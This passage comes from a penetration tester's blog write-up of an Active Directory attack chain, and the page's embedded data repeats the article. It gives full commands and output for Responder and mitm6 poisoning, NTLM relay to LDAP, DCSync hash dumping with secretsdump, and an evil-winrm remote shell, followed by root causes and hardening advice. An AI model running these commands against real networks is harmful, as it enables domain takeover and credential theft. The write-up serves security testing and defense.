[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Running in relay mode to single host
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Multirelay disabled
</code></pre>
<p>The command flags break down as follows:</p>
<ul>
<li><code>-t ldap://dc-server01.corp.local:389</code>: Target the LDAP service on the domain controller</li>
<li><code>--delegate-access</code>: Attempt to configure delegation rights on created computer accounts</li>
<li><code>--no-smb-server</code>: Don't start an SMB server, as we're using Responder for credential capture</li>
</ul>
<h3>Successful Relay and Computer Account Creation</h3>
<p>After running the relay setup for some time, I captured and successfully relayed an authentication attempt from a workstation account:</p>
<pre class="language-none"><code class="language-none">[*] HTTPD(80): Connection from 192.168.0.99 controlled, attacking target ldap://dc-server01.corp.local:389
[*] HTTPD(80): Authenticating against ldap://dc-server01.corp.local:389 as CORP\WORKSTATION-690$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
</code></pre>
<p>The relay was successful, and ntlmrelayx automatically attempted to leverage this access by creating computer accounts:</p>
<pre class="language-none"><code class="language-none">[*] Adding a machine account to the domain requires TLS but ldap:// scheme provided. Switching target to LDAPS via StartTLS
[*] Attempting to create computer in: CN=Computers,DC=corp,DC=local
[*] Adding new computer with username: ATTACKER-PC01$ and password: s0m3p455w0rd result: OK
[*] Delegation rights modified succesfully!
[*] ATTACKER-PC01$ can now impersonate users on WORKSTATION-690$ via S4U2Proxy
[*] Adding new computer with username: ATTACKER-PC02$ and password: s0m3p455w0rd result: OK
[*] Delegation rights modified succesfully!
[*] ATTACKER-PC02$ can now impersonate users on WORKSTATION-690$ via S4U2Proxy
</code></pre>
<p>This was critical - the tool successfully created two machine accounts with delegation rights, meaning they could impersonate users on the targeted workstation through Resource-Based Constrained Delegation (RBCD).</p>
<p>The S4U2Proxy reference in the output refers to "Service for User to Proxy" - a Kerberos extension that allows a service to request tickets on behalf of users. While designed for legitimate scenarios like front-end web servers accessing backend resources, when misconfigured, it becomes a powerful privilege escalation vector.</p>
<h3>Escalating to DCSync Privileges</h3>
<p>Even more importantly, the relay attack was able to modify domain ACLs to grant DCSync privileges to one of the created accounts:</p>
<pre class="language-none"><code class="language-none">[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] User privileges found: Adding user to a privileged group (Enterprise Admins)
[*] User privileges found: Modifying domain ACL
[*] Querying domain security descriptor
[*] Success! User ATTACKER-PC02$ now has Replication-Get-Changes-All privileges on the domain
[*] Try using DCSync with secretsdump.py and this user :)
[*] Saved restore state to aclpwn-20250514-052034.restore
[*] User privileges found: Adding user to a privileged group (Enterprise Admins)
[*] User privileges found: Modifying domain ACL
[*] Adding user: ATTACKER-PC02$ to group Enterprise Admins result: OK
[*] Privilege escalation successful, shutting down...
</code></pre>
<p>This was the jackpot. The relay attack granted our machine account the "Replication-Get-Changes-All" privilege on the domain, which allows for DCSync attacks. Even better, it also added the account to the "Enterprise Admins" group, essentially giving it complete control over the entire Active Directory forest.</p>
<h2>The DCSync Attack Explained</h2>
<p>DCSync simulates a domain controller requesting password data from another DC. It's a legitimate replication mechanism that domain controllers use to synchronize their copies of the Active Directory database (NTDS.dit).</p>
<p>When you execute a DCSync attack, you're sending a Directory Replication Service request to a domain controller, asking it to cough up sensitive user data - specifically password hashes. The domain controller, believing it's sending this data to another authorized DC, happily complies. You then extract the password hashes without ever touching the NTDS.dit file directly.</p>
<p>The "Replication-Get-Changes-All" permission that our machine account received through the relay attack is the key that unlocks this capability. This permission is normally only granted to Domain Controllers and a few high-privilege accounts. With it, we can extract hashes for any account in the domain - including the crown jewels like krbtgt and Domain Admins.</p>
<p>The key permission needed for this attack is "Replication-Get-Changes-All," which is normally only granted to:</p>
<ul>
<li>Domain Controllers</li>
<li>Administrator accounts</li>
<li>Specific service accounts that need to replicate AD data</li>
</ul>
<p>In our case, the NTLM relay attack added this permission to our created machine account, giving us the ability to extract password hashes for any account in the domain, including the most privileged users.</p>
<h3>Why DCSync is So Powerful</h3>
<p>DCSync is particularly devastating because:</p>
<ol>
<li>It's stealthy - it uses legitimate replication protocols rather than exploiting vulnerabilities</li>
<li>It bypasses common defenses like credential guard or Protected Users groups</li>
<li>It extracts ALL credentials from the domain, including those for service accounts and privileged users</li>
<li>It doesn't require direct access to the NTDS.dit file</li>
<li>It can be performed remotely over the network</li>
<li>It leaves minimal traces in the event logs compared to other extraction methods</li>
</ol>
<h2>Domain Takeover via DCSync</h2>
<p>With a machine account that has DCSync privileges, I could now extract password hashes for any domain user, including the krbtgt account and Domain Admins.</p>
<h3>Extracting NTLM Hashes with Secretsdump</h3>
<p>I used Impacket's secretsdump.py tool to perform the DCSync attack:</p>
<pre class="language-bash"><code class="language-bash">impacket-secretsdump \
  -dc-ip 192.168.0.206 \
  -just-dc \
  CORP.LOCAL/ATTACKER-PC02\$:"s0m3p455w0rd"@192.168.0.206
</code></pre>
<p>The parameters in this command are:</p>
<ul>
<li><code>-dc-ip 192.168.0.206</code>: Specifies the IP address of the domain controller</li>
<li><code>-just-dc</code>: Only extract domain credentials (not local SAM hashes)</li>
<li><code>CORP.LOCAL/ATTACKER-PC02\$:"s0m3p455w0rd"</code>: Authentication using our machine account</li>
<li><code>@192.168.0.206</code>: Target domain controller</li>
</ul>
<p>The output revealed complete access to domain credentials:</p>
<pre class="language-none"><code class="language-none">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
CORP.local\Administrator:500:HASH:HASH:::
Guest:501:HASH:HASH:::
krbtgt:502:HASH:HASH:::
CORP\user1:1126:HASH:HASH:::
[MANY MORE ACCOUNTS]
</code></pre>
<p>Each hash contains the username and RID, followed by the LM hash (typically empty in modern systems) and the NT hash. The krbtgt hash is gold for creating Golden Tickets, while the Administrator hash gives immediate access to domain controllers and other systems.</p>
<h3>Confirming Enterprise Admin Access</h3>
<p>To verify the success of the attack, I used Evil-WinRM to establish a remote PowerShell session to a domain controller:</p>
<pre class="language-bash"><code class="language-bash">evil-winrm -i 192.168.0.206 -u 'ATTACKER-PC02$' -p 's0m3p455w0rd'
</code></pre>
<p>Evil-WinRM leverages Windows Remote Management to give you a remote shell on Windows systems. It runs over standard ports often allowed through firewalls (5985/5986), provides a fully interactive PowerShell session, and includes convenient features for file transfers and script execution. Once connected, I confirmed our elevated privileges:</p>
<pre class="language-bash"><code class="language-bash">*Evil-WinRM* PS C:\Users\ATTACKER-PC02$\Documents> net group "Enterprise Admins" /domain
Group name     Enterprise Admins
Comment        Designated administrators of the enterprise

Members

-------------------------------------------------------------------------------
Administrator            ATTACKER-PC02$          domainadmin
sql_admin                svcaccount              
The command completed successfully.
</code></pre>
<p>This completed the attack chain - from having no credentials, I was able to obtain complete control over the Active Directory forest by exploiting a series of misconfigurations.</p>
<h2>Machine Account Quota: The Critical Misconfiguration</h2>
<p>The crucial enabler for this attack chain was the default Machine Account Quota (MAQ) setting. This often-overlooked Active Directory configuration determines how many computer accounts a regular user can add to the domain.</p>
<pre class="language-bash"><code class="language-bash">netexec ldap 192.168.0.206 -u 'ATTACKER-PC02$' -p 's0m3p455w0rd' -d corp.local -M maq
LDAP        192.168.0.206      389    DC-SERVER01      [*] Windows Server 2022 Build 20348 (name:DC-SERVER01) (domain:CORP.local)
LDAP        192.168.0.206      389    DC-SERVER01      [+] corp.local\ATTACKER-PC02$:s0m3p455w0rd
MAQ         192.168.0.206      389    DC-SERVER01      [*] Getting the MachineAccountQuota
MAQ         192.168.0.206      389    DC-SERVER01      MachineAccountQuota: 10
</code></pre>
<p>In this environment, the MAQ was set to the default value of 10, allowing any authenticated user to create up to 10 computer accounts. This default setting provided the foothold needed for our attack - without it, the NTLM relay wouldn't have been able to create the machine accounts that subsequently received DCSync privileges.</p>
<p>Many organizations don't realize that this default setting effectively hands attackers the ability to establish persistence within the domain with minimal privileges. While Microsoft sets this default to simplify administration, most security standards recommend reducing it to 0, requiring explicit administrative approval for all computer account creations.</p>
<p>The ability to add computer accounts in our relay attack opened the door for the next critical phase: escalating to DCSync privileges through ACL manipulation.</p>
<h2>From Zero Access to Enterprise Admin: The Full Attack Path</h2>
<p>The attack path from zero credentials to full domain takeover follows a clear progression:</p>
<p>Starting with no credentials on the internal network, I identified systems with SMB signing disabled and began network poisoning. Using Responder and MITM6, I intercepted authentication traffic and captured NTLMv2 hashes.</p>
<p>Rather than wasting time trying to crack these hashes, I set up an NTLM relay attack with Impacket's ntlmrelayx. When a machine authenticated to me, I relayed that authentication to the domain controller's LDAP service.</p>
<p>This relay allowed me to create machine accounts with special delegation rights. More importantly, I managed to modify domain ACLs to grant my machine account DCSync privileges and add it to the Enterprise Admins group.</p>
<p>With DCSync privileges, I extracted all domain credential hashes using secretsdump. This gave me the keys to the kingdom - including the krbtgt hash for Golden Tickets and the Administrator hash for direct domain access.</p>
<p>I confirmed my access by establishing a PowerShell session to the domain controller via Evil-WinRM and verifying my Enterprise Admin group membership.</p>
<p>All of this was possible without exploiting a single unpatched vulnerability - just abusing common misconfigurations that exist in many AD environments by default.</p>
<h2>Root Causes &#x26; Attack Chain Summary</h2>
<p>This attack chain exploited several key misconfigurations:</p>
<p>SMB Signing Not Required - Almost all machines in the domain had SMB signing disabled. This allowed for NTLM relay attacks against services like LDAP.</p>
<p>LLMNR/NBT-NS Enabled - Windows name resolution fallback protocols were enabled, allowing for poisoning attacks to capture authentication attempts.</p>
<p>IPv6 DNS Misconfiguration - IPv6 was enabled but not properly secured, letting MITM6 spoof DNS responses over IPv6.</p>
<p>Weak ACLs on Domain Objects - The relayed authentication had sufficient privileges to modify domain ACLs, allowing for escalation to DCSync privileges and Enterprise Admin group membership.</p>
<p>High Machine Account Quota - Default setting of 10 computer accounts per user provided additional attack vectors for domain compromise.</p>
<h2>Conclusion</h2>
<p>This attack chain demonstrates how a series of common misconfigurations can lead to complete domain compromise, even without exploiting any software vulnerabilities. Starting from zero credentials, I was able to:</p>
<ol>
<li>Identify machines with SMB signing disabled</li>
<li>Capture authentication attempts using LLMNR/NBT-NS poisoning and IPv6 DNS spoofing</li>
<li>Relay those authentication attempts to create privileged computer accounts</li>
<li>Escalate to DCSync privileges and Enterprise Admin membership</li>
<li>Extract password hashes for all domain users</li>
<li>Confirm complete control over the domain</li>
</ol>
<p>What's particularly concerning is that many of these misconfigurations exist by default in Windows environments. Organizations need to proactively harden their Active Directory configurations to protect against these attack vectors.</p>
<p>Remember: security is not about patching the latest vulnerabilities but about properly configuring and securing the foundations of your infrastructure. As this case demonstrates, even a fully patched environment can be completely compromised due to misconfiguration.</p>
<hr>
<p><em>Disclaimer: This article is provided for educational purposes only. The techniques described should only be used in authorized environments and security research contexts. Always follow responsible disclosure practices and operate within legal and ethical boundaries.</em></p>
</div></article></main><footer class="bg-primary/90 border-t border-gray-800"><div class="container py-6"><div class="flex justify-center items-center"><div class="text-sm text-gray-400">© <!-- -->2025<!-- --> Ivan Spiridonov (xbz0n). All rights reserved.</div></div></div></footer></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"slug":"from-zero-creds-to-ea","contentHtml":"\n\u003cp\u003e\u003cimg src=\"/images/ad-attack-chain.jpg\" alt=\"Active Directory Attack Chain\"\u003e\u003c/p\u003e\n\u003ch2\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eActive Directory remains the backbone of most corporate network environments. Despite being a mature technology with decades of security research behind it, misconfigurations and default settings continue to provide avenues for attackers to gain complete control of Windows domains.\u003c/p\u003e\n\u003cp\u003eThis article details how I was able to go from having zero credentials to obtaining Enterprise Admin access during a recent engagement. The attack chain demonstrates how several seemingly minor misconfigurations can be chained together to compromise an entire Active Directory forest.\u003c/p\u003e\n\u003cp\u003eWhat makes this attack particularly effective is that it requires no exploitation of unpatched vulnerabilities - just the abuse of insecure configurations that exist in many corporate environments by default.\u003c/p\u003e\n\u003ch2\u003eInitial Reconnaissance\u003c/h2\u003e\n\u003cp\u003eThe first phase of any internal network test involves thorough enumeration to identify potential targets and vulnerabilities. Using standard tools like Nmap, Nessus Professional, and custom scripts, I performed an intensive network scan covering all 65,535 TCP ports and key UDP ports to discover the attack surface.\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003esudo nmap -sS -sV -p- --min-rate 10000 -oA full_scan 192.168.0.0/24\nsudo nmap -sU -sV --top-ports 200 -oA udp_scan 192.168.0.0/24\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe scans revealed a substantial Windows environment with numerous servers and workstations, providing plenty of targets for further investigation.\u003c/p\u003e\n\u003ch2\u003eIdentifying Key Misconfigurations\u003c/h2\u003e\n\u003ch3\u003eSMB Signing Not Required\u003c/h3\u003e\n\u003cp\u003eOne of the first things I look for in Windows environments is whether SMB signing is enforced. SMB signing provides integrity protection for SMB traffic, preventing man-in-the-middle attacks. When it's not required, attackers can intercept and relay authentication attempts to gain unauthorized access.\u003c/p\u003e\n\u003cp\u003eI used NetExec (formerly CrackMapExec) to identify hosts with SMB signing not required:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003enxc smb 192.168.0.0/24 --gen-relay-list smb_targets.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe results were promising - virtually all machines in the domain had SMB signing disabled:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003eSMB         192.168.0.11       445    DC-SERVER01      [*] Windows Server 2022 Build 20348 x64 (name:DC-SERVER01) (domain:CORP.local) (signing:False) (SMBv1:False)\nSMB         192.168.0.10       445    APP-SERVER01     [*] Windows Server 2022 Build 20348 x64 (name:APP-SERVER01) (domain:CORP.local) (signing:False) (SMBv1:False)\nSMB         192.168.0.28       445    SQL-SERVER01     [*] Windows 10 / Server 2016 Build 14393 x64 (name:SQL-SERVER01) (domain:CORP.local) (signing:False) (SMBv1:False)\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eSetting Up for MITM Attacks\u003c/h2\u003e\n\u003cp\u003eGiven the SMB signing issues, the next logical step was to attempt network poisoning to intercept authentication traffic. This approach leverages how Windows systems attempt to resolve hostnames and authenticate to network resources.\u003c/p\u003e\n\u003ch3\u003eLLMNR/NBT-NS Poisoning with Responder\u003c/h3\u003e\n\u003cp\u003eLink-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are name resolution protocols used by Windows when DNS fails. These protocols are vulnerable to poisoning attacks where an attacker can respond to broadcast queries and capture authentication hashes.\u003c/p\u003e\n\u003cp\u003eI started Responder to listen for and respond to these broadcasts:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003esudo responder -I eth0 -wd\n                                         __\n  .----.-----.-----.-----.-----.-----.--|  |.-----.----.\n  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|\n  |__| |_____|_____|   __|_____|__|__|_____||_____|__|\n                   |__|\n\n           NBT-NS, LLMNR \u0026#x26; MDNS Responder 3.1.5.0\n\n[+] Poisoners:\n    LLMNR                      [ON]\n    NBT-NS                     [ON]\n    MDNS                       [ON]\n    DNS                        [ON]\n    DHCP                       [ON]\n\n[+] Servers:\n    HTTP server                [OFF]\n    HTTPS server               [OFF]\n    WPAD proxy                 [ON]\n    Auth proxy                 [OFF]\n    SMB server                 [OFF]\n    Kerberos server            [OFF]\n    SQL server                 [OFF]\n    FTP server                 [OFF]\n    IMAP server                [OFF]\n    POP3 server                [OFF]\n    SMTP server                [OFF]\n    DNS server                 [OFF]\n    LDAP server                [OFF]\n    MQTT server                [OFF]\n    RDP server                 [OFF]\n    DCE-RPC server             [OFF]\n    WinRM server               [OFF]\n    SNMP server                [OFF]\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eIPv6 DNS Poisoning with MITM6\u003c/h3\u003e\n\u003cp\u003eTo increase my chances of intercepting authentication, I also deployed MITM6. This tool exploits the fact that Windows prioritizes IPv6 over IPv4 by default, but many corporate networks haven't properly secured their IPv6 implementation.\u003c/p\u003e\n\u003cp\u003eMITM6 spoofs IPv6 router advertisements and DNS responses, forcing Windows clients to use the attacker as their DNS server:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003esudo mitm6 -d corp.local\n\nStarting mitm6 using the following configuration:\nPrimary adapter: eth0 [00:0c:29:9a:b1:c2]\nIPv4 address: 192.168.0.3\nIPv6 address: fe80::20c:29ff:fe9a:b1c2\nDNS local search domain: corp.local\nDNS allowlist: corp.local\nSent spoofed reply for FILE-SERVER01.corp.local. to fe80::1eb8:804e:abdc:2526\nIPv6 address fe80::3908:1 is now assigned to mac=fc:3f:db:53:fd:1d\nSent spoofed reply for DC-APPSERVER.corp.local. to fe80::a1c2:7cd2:e569:b991\nSent spoofed reply for wpad.corp.local. to fe80::a1c2:7cd2:e569:b991\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eCredential Capture\u003c/h2\u003e\n\u003cp\u003eAfter running Responder and MITM6 for just a short time, I captured several NTLMv2 hashes from domain users and service accounts:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e[*] [NTLM] NTLMv2-SSP Client   : 192.168.0.107\n[*] [NTLM] NTLMv2-SSP Username : CORP\\FILE-SERVER01$\n[*] [NTLM] NTLMv2-SSP Hash     : FILE-SERVER01$::CORP:1122334455667788:A1B2C3D4E5F6A7B8C9D0A1B2C3D4E5F6:0101000000000000...\n\n[*] [NTLM] NTLMv2-SSP Client   : 192.168.0.64\n[*] [NTLM] NTLMv2-SSP Username : CORP\\jifko.admin\n[*] [NTLM] NTLMv2-SSP Hash     : jifko.admin::CORP:1122334455667788:A1B2C3D4E5F6A7B8C9D0A1B2C3D4E5F6:0101000000000000...\n\n[*] [NTLM] NTLMv2-SSP Client   : 192.168.0.28\n[*] [NTLM] NTLMv2-SSP Username : CORP\\sqlservice\n[*] [NTLM] NTLMv2-SSP Hash     : sqlservice::CORP:1122334455667788:A1B2C3D4E5F6A7B8C9D0A1B2C3D4E5F6:0101000000000000...\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eUnderstanding NTLM Relay Attacks\u003c/h2\u003e\n\u003cp\u003eNTLM is Microsoft's legacy authentication protocol used throughout Active Directory. In a standard NTLM exchange, a client sends an authentication request, the server responds with a challenge, and the client returns a response based on its password hash. The server verifies this response to authenticate the user.\u003c/p\u003e\n\u003cp\u003eDuring a relay attack, I position myself in the middle of this exchange. When a client tries to authenticate to me (thinking I'm a legitimate server), I immediately forward those authentication messages to a target of my choosing. The target server sends back a challenge, which I relay to the client. The client responds with valid credentials, which I pass along to the target - effectively impersonating that user without ever knowing their password.\u003c/p\u003e\n\u003cp\u003eThe beauty of this attack is that I never need to crack a single password hash. I'm simply relaying the legitimate authentication messages in real time. This is exactly why SMB signing is critical - it cryptographically links the authentication messages together to prevent this kind of manipulation.\u003c/p\u003e\n\u003ch2\u003eImpacket: The Red Team's Network Protocol Toolkit\u003c/h2\u003e\n\u003cp\u003eFor the relay attacks, I turned to Impacket - the go-to Python framework for low-level protocol manipulation. Impacket lets you craft, dissect, and manipulate network packets across virtually all Windows protocols including SMB, MSRPC, NTLM, and Kerberos.\u003c/p\u003e\n\u003cp\u003eUnlike high-level libraries that abstract away the protocol details, Impacket gives you direct access to the raw protocol interactions, making it perfect for offensive security testing. My attack chain relied primarily on two Impacket tools: ntlmrelayx for relaying NTLM authentication and secretsdump for extracting credentials via DCSync.\u003c/p\u003e\n\u003cp\u003eOther Impacket gems include psexec, wmiexec, and smbexec for remote command execution, GetUserSPNs for Kerberoasting, and GetNPUsers for AS-REP roasting. The framework handles all the low-level details of Windows authentication, letting you focus on the attack strategy rather than protocol implementation.\u003c/p\u003e\n\u003ch2\u003eNTLM Relay Attack\u003c/h2\u003e\n\u003cp\u003eHaving identified machines with SMB signing disabled and captured authentication attempts, I was ready to set up an NTLM relay attack. Rather than trying to crack the hashes (which could be time-consuming or impossible for complex passwords), I decided to relay them to target services.\u003c/p\u003e\n\u003ch3\u003eSetting up NTLM Relay to LDAP\u003c/h3\u003e\n\u003cp\u003eI configured Impacket's ntlmrelayx tool to relay authentication attempts to the domain controller's LDAP service. By using the \u003ccode\u003e--delegate-access\u003c/code\u003e option, I would be able to create computer accounts with special delegation rights:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003esudo impacket-ntlmrelayx \\\n  -t ldap://dc-server01.corp.local:389 \\\n  --delegate-access \\\n  --no-smb-server\n\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies\n\n[*] Protocol Client HTTPS loaded..\n[*] Protocol Client HTTP loaded..\n[*] Protocol Client RPC loaded..\n[*] Protocol Client MSSQL loaded..\n[*] Protocol Client DCSYNC loaded..\n[*] Protocol Client IMAP loaded..\n[*] Protocol Client IMAPS loaded..\n[*] Protocol Client LDAPS loaded..\n[*] Protocol Client LDAP loaded..\n[*] Protocol Client SMTP loaded..\n[*] Protocol Client SMB loaded..\n[*] Running in relay mode to single host\n[*] Setting up HTTP Server on port 80\n[*] Setting up WCF Server on port 9389\n[*] Setting up RAW Server on port 6666\n[*] Multirelay disabled\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe command flags break down as follows:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e-t ldap://dc-server01.corp.local:389\u003c/code\u003e: Target the LDAP service on the domain controller\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e--delegate-access\u003c/code\u003e: Attempt to configure delegation rights on created computer accounts\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e--no-smb-server\u003c/code\u003e: Don't start an SMB server, as we're using Responder for credential capture\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3\u003eSuccessful Relay and Computer Account Creation\u003c/h3\u003e\n\u003cp\u003eAfter running the relay setup for some time, I captured and successfully relayed an authentication attempt from a workstation account:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e[*] HTTPD(80): Connection from 192.168.0.99 controlled, attacking target ldap://dc-server01.corp.local:389\n[*] HTTPD(80): Authenticating against ldap://dc-server01.corp.local:389 as CORP\\WORKSTATION-690$ SUCCEED\n[*] Enumerating relayed user's privileges. This may take a while on large domains\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe relay was successful, and ntlmrelayx automatically attempted to leverage this access by creating computer accounts:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e[*] Adding a machine account to the domain requires TLS but ldap:// scheme provided. Switching target to LDAPS via StartTLS\n[*] Attempting to create computer in: CN=Computers,DC=corp,DC=local\n[*] Adding new computer with username: ATTACKER-PC01$ and password: s0m3p455w0rd result: OK\n[*] Delegation rights modified succesfully!\n[*] ATTACKER-PC01$ can now impersonate users on WORKSTATION-690$ via S4U2Proxy\n[*] Adding new computer with username: ATTACKER-PC02$ and password: s0m3p455w0rd result: OK\n[*] Delegation rights modified succesfully!\n[*] ATTACKER-PC02$ can now impersonate users on WORKSTATION-690$ via S4U2Proxy\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis was critical - the tool successfully created two machine accounts with delegation rights, meaning they could impersonate users on the targeted workstation through Resource-Based Constrained Delegation (RBCD).\u003c/p\u003e\n\u003cp\u003eThe S4U2Proxy reference in the output refers to \"Service for User to Proxy\" - a Kerberos extension that allows a service to request tickets on behalf of users. While designed for legitimate scenarios like front-end web servers accessing backend resources, when misconfigured, it becomes a powerful privilege escalation vector.\u003c/p\u003e\n\u003ch3\u003eEscalating to DCSync Privileges\u003c/h3\u003e\n\u003cp\u003eEven more importantly, the relay attack was able to modify domain ACLs to grant DCSync privileges to one of the created accounts:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e[*] Enumerating relayed user's privileges. This may take a while on large domains\n[*] User privileges found: Adding user to a privileged group (Enterprise Admins)\n[*] User privileges found: Modifying domain ACL\n[*] Querying domain security descriptor\n[*] Success! User ATTACKER-PC02$ now has Replication-Get-Changes-All privileges on the domain\n[*] Try using DCSync with secretsdump.py and this user :)\n[*] Saved restore state to aclpwn-20250514-052034.restore\n[*] User privileges found: Adding user to a privileged group (Enterprise Admins)\n[*] User privileges found: Modifying domain ACL\n[*] Adding user: ATTACKER-PC02$ to group Enterprise Admins result: OK\n[*] Privilege escalation successful, shutting down...\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis was the jackpot. The relay attack granted our machine account the \"Replication-Get-Changes-All\" privilege on the domain, which allows for DCSync attacks. Even better, it also added the account to the \"Enterprise Admins\" group, essentially giving it complete control over the entire Active Directory forest.\u003c/p\u003e\n\u003ch2\u003eThe DCSync Attack Explained\u003c/h2\u003e\n\u003cp\u003eDCSync simulates a domain controller requesting password data from another DC. It's a legitimate replication mechanism that domain controllers use to synchronize their copies of the Active Directory database (NTDS.dit).\u003c/p\u003e\n\u003cp\u003eWhen you execute a DCSync attack, you're sending a Directory Replication Service request to a domain controller, asking it to cough up sensitive user data - specifically password hashes. The domain controller, believing it's sending this data to another authorized DC, happily complies. You then extract the password hashes without ever touching the NTDS.dit file directly.\u003c/p\u003e\n\u003cp\u003eThe \"Replication-Get-Changes-All\" permission that our machine account received through the relay attack is the key that unlocks this capability. This permission is normally only granted to Domain Controllers and a few high-privilege accounts. With it, we can extract hashes for any account in the domain - including the crown jewels like krbtgt and Domain Admins.\u003c/p\u003e\n\u003cp\u003eThe key permission needed for this attack is \"Replication-Get-Changes-All,\" which is normally only granted to:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eDomain Controllers\u003c/li\u003e\n\u003cli\u003eAdministrator accounts\u003c/li\u003e\n\u003cli\u003eSpecific service accounts that need to replicate AD data\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eIn our case, the NTLM relay attack added this permission to our created machine account, giving us the ability to extract password hashes for any account in the domain, including the most privileged users.\u003c/p\u003e\n\u003ch3\u003eWhy DCSync is So Powerful\u003c/h3\u003e\n\u003cp\u003eDCSync is particularly devastating because:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eIt's stealthy - it uses legitimate replication protocols rather than exploiting vulnerabilities\u003c/li\u003e\n\u003cli\u003eIt bypasses common defenses like credential guard or Protected Users groups\u003c/li\u003e\n\u003cli\u003eIt extracts ALL credentials from the domain, including those for service accounts and privileged users\u003c/li\u003e\n\u003cli\u003eIt doesn't require direct access to the NTDS.dit file\u003c/li\u003e\n\u003cli\u003eIt can be performed remotely over the network\u003c/li\u003e\n\u003cli\u003eIt leaves minimal traces in the event logs compared to other extraction methods\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003eDomain Takeover via DCSync\u003c/h2\u003e\n\u003cp\u003eWith a machine account that has DCSync privileges, I could now extract password hashes for any domain user, including the krbtgt account and Domain Admins.\u003c/p\u003e\n\u003ch3\u003eExtracting NTLM Hashes with Secretsdump\u003c/h3\u003e\n\u003cp\u003eI used Impacket's secretsdump.py tool to perform the DCSync attack:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003eimpacket-secretsdump \\\n  -dc-ip 192.168.0.206 \\\n  -just-dc \\\n  CORP.LOCAL/ATTACKER-PC02\\$:\"s0m3p455w0rd\"@192.168.0.206\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe parameters in this command are:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e-dc-ip 192.168.0.206\u003c/code\u003e: Specifies the IP address of the domain controller\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e-just-dc\u003c/code\u003e: Only extract domain credentials (not local SAM hashes)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eCORP.LOCAL/ATTACKER-PC02\\$:\"s0m3p455w0rd\"\u003c/code\u003e: Authentication using our machine account\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e@192.168.0.206\u003c/code\u003e: Target domain controller\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThe output revealed complete access to domain credentials:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003eImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies\n\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nCORP.local\\Administrator:500:HASH:HASH:::\nGuest:501:HASH:HASH:::\nkrbtgt:502:HASH:HASH:::\nCORP\\user1:1126:HASH:HASH:::\n[MANY MORE ACCOUNTS]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eEach hash contains the username and RID, followed by the LM hash (typically empty in modern systems) and the NT hash. The krbtgt hash is gold for creating Golden Tickets, while the Administrator hash gives immediate access to domain controllers and other systems.\u003c/p\u003e\n\u003ch3\u003eConfirming Enterprise Admin Access\u003c/h3\u003e\n\u003cp\u003eTo verify the success of the attack, I used Evil-WinRM to establish a remote PowerShell session to a domain controller:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003eevil-winrm -i 192.168.0.206 -u 'ATTACKER-PC02$' -p 's0m3p455w0rd'\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eEvil-WinRM leverages Windows Remote Management to give you a remote shell on Windows systems. It 